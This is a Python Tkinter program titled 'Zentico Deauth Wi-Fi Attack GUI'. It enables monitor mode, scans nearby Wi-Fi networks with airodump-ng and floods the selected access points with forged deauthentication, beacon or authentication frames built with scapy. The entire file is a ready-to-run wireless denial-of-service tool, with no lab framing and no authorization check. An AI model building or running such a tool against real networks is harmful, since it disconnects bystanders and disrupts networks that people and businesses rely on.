import tkinter as tk
from tkinter import ttk, messagebox
import subprocess, threading, re, os, time
from scapy.all import *

# Global vars
airodump_proc = None
networks = []
monitor_interface = ""
attack_running = False
attack_thread = None
csv_file = "/tmp/scan_results-01.csv"

# Stats
total_packets = 0
start_time = None

# Cleanup
def clear_csv():
    try:
        os.remove(csv_file)
    except:
        pass

# List adapters
def list_adapters():
    res = subprocess.run(["iwconfig"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
    adapters = re.findall(r'^([a-zA-Z0-9]+)\s+IEEE', res.stdout, re.MULTILINE)
    adapter_combo['values'] = adapters
    if adapters: adapter_combo.current(0)

# Monitor mode
def enable_monitor():
    global monitor_interface
    ad = adapter_combo.get()
    if ad:
        for cmd in (["ifconfig", ad, "down"], ["iwconfig", ad, "mode", "monitor"], ["ifconfig", ad, "up"]):
            subprocess.run(["sudo"] + cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        monitor_interface = ad
        log(f"[*] {ad} -> monitor mode enabled")
    else:
        messagebox.showerror("Error", "Select a network adapter")

def disable_monitor():
    global attack_running, monitor_interface
    ad = adapter_combo.get()
    if ad:
        # Stop ongoing attack when disabling monitor mode
        if attack_running:
            attack_running = False
            attack_button.config(text="Start Attack")
            log("[*] Attack stopped due to disabling monitor mode")

        for cmd in (["ifconfig", ad, "down"], ["iwconfig", ad, "mode", "managed"], ["ifconfig", ad, "up"]):
            subprocess.run(["sudo"] + cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        monitor_interface = ""  # Monitor arayüzü boşaltıldı, artık saldırı başlatılamaz.
        log(f"[*] {ad} -> managed mode enabled")

# Logging
def log(msg):
    log_text.insert(tk.END, msg + "\n")
    log_text.see(tk.END)

# Scan networks
def start_scan():
    global airodump_proc
    clear_csv()
    if not monitor_interface:
        messagebox.showerror("Error", "Enable monitor mode first")
        return
    log("[*] Starting network scan…")
    airodump_proc = subprocess.Popen(["sudo", "airodump-ng", "-w", "/tmp/scan_results", "--output-format", "csv", monitor_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    threading.Thread(target=parse_csv, daemon=True).start()

def parse_csv():
    while True:
        time.sleep(2)
        if not os.path.exists(csv_file): continue
        lines = open(csv_file, "r", errors="ignore").readlines()
        tmp = []
        for l in lines:
            if l.startswith("BSSID") or not l.strip(): continue
            parts = l.split(",")
            if len(parts) > 13:
                b, s = parts[0].strip(), parts[13].strip()
                if b and s: tmp.append((s, b))
        update_list(tmp)

def update_list(tmp):
    sel = set(network_tree.selection())
    networks.clear()
    network_tree.delete(*network_tree.get_children())
    for i, (s, b) in enumerate(tmp):
        networks.append((s, b))
        network_tree.insert("", "end", iid=str(i), values=(s, b))
    for sid in sel:
        if sid in network_tree.get_children():
            network_tree.selection_add(sid)

def stop_scan():
    global airodump_proc
    if airodump_proc:
        airodump_proc.terminate()
        airodump_proc = None
        log("[*] Scan stopped")

# Attack thread
def attack_loop():
    global total_packets
    global start_time

    total_packets = 0
    start_time = time.time()
    attack_type = attack_combo.get()
    interval = slider.get() / 1000
    targets = [networks[int(i)][1] for i in network_tree.selection()]
    if not targets:
        messagebox.showerror("Error", "Select at least one network")
        toggle_attack()
        return

    while attack_running:
        for bssid in targets:
            if not attack_running:
                break
            if attack_type == "Deauth":
                pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth()
            elif attack_type == "Beacon Flood":
                pkt = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Beacon() / Dot11Elt(ID="SSID", info="TestNet")
            elif attack_type == "Auth Flood":
                pkt = RadioTap() / Dot11(type=0, subtype=11, addr1=bssid, addr2="00:11:22:33:44:55", addr3=bssid) / Dot11Auth()
            sendp(pkt, iface=monitor_interface, count=1, inter=interval, verbose=0)
            total_packets += 1
        elapsed = time.time() - start_time
        stat_label.config(text=f"Packets: {total_packets} | Time: {int(elapsed)}s")
        root.update_idletasks()

def toggle_attack():
    global attack_running, attack_thread, monitor_interface
    if not monitor_interface:
        messagebox.showerror("Error", "Monitor mode is not enabled. Please enable monitor mode first.")
        return

    if not attack_running:
        attack_running = True
        attack_thread = threading.Thread(target=attack_loop, daemon=True)
        attack_thread.start()
        attack_button.config(text="Stop Attack")
        log("[!] Attack started")
    else:
        attack_running = False
        attack_button.config(text="Start Attack")
        log("[*] Attack stopped")

# GUI
root = tk.Tk()
root.title("Zentico Deauth Wi-Fi Attack GUI")
root.geometry("880x640")

# Top frame
top = tk.Frame(root)
top.pack(pady=10)
tk.Label(top, text="Adapter:").grid(row=0, column=0)
adapter_combo = ttk.Combobox(top, width=12)
adapter_combo.grid(row=0, column=1)
tk.Button(top, text="Refresh", command=list_adapters).grid(row=0, column=2)
tk.Button(top, text="Enable Monitor", command=enable_monitor).grid(row=0, column=3)
tk.Button(top, text="Disable Monitor", command=disable_monitor).grid(row=0, column=4)

# Middle frame
mid = tk.Frame(root)
mid.pack(pady=5)
tk.Button(mid, text="Scan", command=start_scan).grid(row=0, column=0)
tk.Button(mid, text="Stop Scan", command=stop_scan).grid(row=0, column=1)
tk.Label(mid, text="Attack Type:").grid(row=0, column=2, padx=5)
attack_combo = ttk.Combobox(mid, values=["Deauth", "Beacon Flood", "Auth Flood"], state="readonly", width=12)
attack_combo.grid(row=0, column=3)
attack_combo.current(0)

tk.Label(mid, text="Delay (ms):").grid(row=0, column=4, padx=5)
slider = tk.Scale(mid, from_=1, to=1000, orient=tk.HORIZONTAL, length=200)
slider.set(50)
slider.grid(row=0, column=5)

btn_frame = tk.Frame(root)
btn_frame.pack(pady=10)
attack_button = tk.Button(btn_frame, text="Start Attack", width=20, command=toggle_attack)
attack_button.pack()

cols = ("SSID", "MAC")
network_tree = ttk.Treeview(root, columns=cols, show="headings", selectmode="extended", height=12)
for c in cols:
    network_tree.heading(c, text=c)
    network_tree.column(c, width=300)
network_tree.pack(padx=10, pady=10)

stat_label = tk.Label(root, text="Packets: 0 | Time: 0s")
stat_label.pack()

log_text = tk.Text(root, height=8)
log_text.pack(fill="both", expand=True, padx=10, pady=10)

list_adapters()
root.mainloop()
